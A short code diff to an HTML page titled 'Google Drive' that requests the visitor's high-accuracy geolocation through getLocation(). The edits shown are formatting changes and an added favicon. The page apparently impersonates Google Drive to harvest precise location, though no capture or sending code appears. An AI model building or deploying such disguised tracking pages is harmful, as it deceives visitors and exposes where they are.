@@ -7,9 +7,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Google Drive</title>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Drive</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="https://toppng.com/free-colorful-icons-google-drive-transparent-background-PNG-free-PNG-Images_218942" />
 </head>
 <body>
 
@@ -51,7 +52,7 @@ function onErr(err){
 //High Accuracy is enabled for precious location
 const options = {
   enableHighAccuracy: true
-  }
+}
 
 getLocation()
 
